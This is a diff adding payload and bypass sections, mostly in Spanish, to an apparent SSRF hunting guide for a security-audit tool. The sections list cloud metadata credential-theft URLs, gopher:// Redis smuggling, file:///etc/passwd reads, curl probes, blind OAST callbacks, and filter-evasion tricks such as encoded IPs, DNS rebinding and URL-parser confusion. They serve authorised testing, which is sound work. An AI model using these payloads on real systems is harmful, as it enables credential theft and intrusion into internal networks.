@@ -153,6 +153,55 @@ chains_with: [info-disclosure, rce, auth-bypass]
 - `ffuf` — fuzz internal IP ranges/ports through a confirmed SSRF primitive to map internal
   network (`ffuf -w ports.txt -u "https://target/proxy?url=http://10.0.0.5:FUZZ"`).
 
+## Payloads & Detection Patterns
+
+Guía de caza: una familia por primitiva de alcance interno. Para vectores ciegos, el único camino
+a `Demonstrated` es un hit correlacionado por token en el gate OOB.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Internal addressing | `http://127.0.0.1/`, `http://localhost/`, `http://[::1]/` | Alcanzar loopback y servicios internos |
+| Cloud metadata | AWS `http://169.254.169.254/latest/meta-data/`, GCP `http://metadata.google.internal/computeMetadata/v1/`, Azure `http://169.254.169.254/metadata/instance?api-version=2021-02-01`, Alibaba `http://100.100.100.200/latest/meta-data/` | Robo de credenciales de instancia (IMDS) |
+| Blind OOB probe | `http://TOKEN.<domain>.oast.site/` | Confirmar fetch ciego vía callback con token |
+| Protocol smuggling | `gopher://127.0.0.1:6379/_...`, `dict://127.0.0.1:11211/`, `file:///etc/passwd` | Alcanzar Redis/Memcached/FS más allá de HTTP |
+| Internal port scan | `http://10.0.0.5:FUZZ/` | Mapear red interna por diff de timing/estado |
+| Redirect pivot | URL propia que responde 302 → destino interno | Saltar validador que solo chequea el host inicial |
+
+Surface signals que delatan la clase antes de inyectar:
+- Params `url`, `uri`, `dest`, `callback`, `webhook`, `feed`, `image`, `src`, `endpoint`, `path`.
+- Features: "import from URL", unfurl/preview, PDF/screenshot render, SVG `<image href>`, SSO metadata URL.
+- Banners/errores que revelan el cloud provider (AWS/GCP/Azure/Alibaba) → IMDS de alto valor.
+- WAF que responde distinto a URLs internas vs externas → oráculo parcial de que el fetch se intenta.
+
+```bash
+# detección ciega con token OAST (gate obligatorio para vectores blind)
+python3 -m engine.oast token --audit-dir . --purpose blind-ssrf --vuln-class ssrf \
+  --target-url https://target/api/webhook --parameter url        # -> payload_url con token
+curl -s -X POST https://target/api/webhook -H 'Content-Type: application/json' \
+  -d '{"url":"http://TOKEN.DOMAIN.oast.site/"}'
+python3 -m engine.oast poll --audit-dir .                         # hit correlacionado = Demonstrated
+```
+
+```bash
+# probe response-reflected (no ciego) con control externo
+curl -s "https://target/fetch?url=http://169.254.169.254/latest/meta-data/"   # payload interno
+curl -s "https://target/fetch?url=http://example.com/"                        # control externo
+```
+
+## Bypass Techniques
+
+Agrupadas por la defensa que evaden; probar la familia completa antes de declarar no-vulnerable.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Blocklist de IP literal | Decimal `http://2130706433/`, octal `http://0177.0.0.1/`, hex `http://0x7f.0.0.1/`, short `http://127.1/` | Evita el match textual de `127.0.0.1` |
+| Blocklist de hostname | DNS público que resuelve interno `localtest.me`, `169.254.169.254.nip.io`, IPv6-mapped `[::ffff:127.0.0.1]` | El validador no resuelve antes de comparar |
+| Allowlist por host inicial | Redirect 302 desde infra propia al destino interno | Fetcher sigue redirects sin re-validar destino final |
+| Validación resolve-time | DNS rebinding (TOCTOU resolver→connect) | Requiere infra de rebinding; demostrar el rebind real, no solo el bypass |
+| Esquema restringido | `gopher://`, `dict://`, `file://` si el cliente HTTP los soporta | Depende de la librería subyacente |
+| Parser de URL confuso | `http://allowed@evil/`, `http://evil#@allowed/`, backslash `http://allowed\.evil/` | Discrepancia entre validador y cliente HTTP |
+| IMDSv2 enforced | Sin control de headers no se puede PUT el token de sesión | Degradar severidad, no reclamar compromiso total de IMDS |
+
 ## Root Causes
 
 - Server-side URL fetchers with no allowlist of destination hosts/schemes.
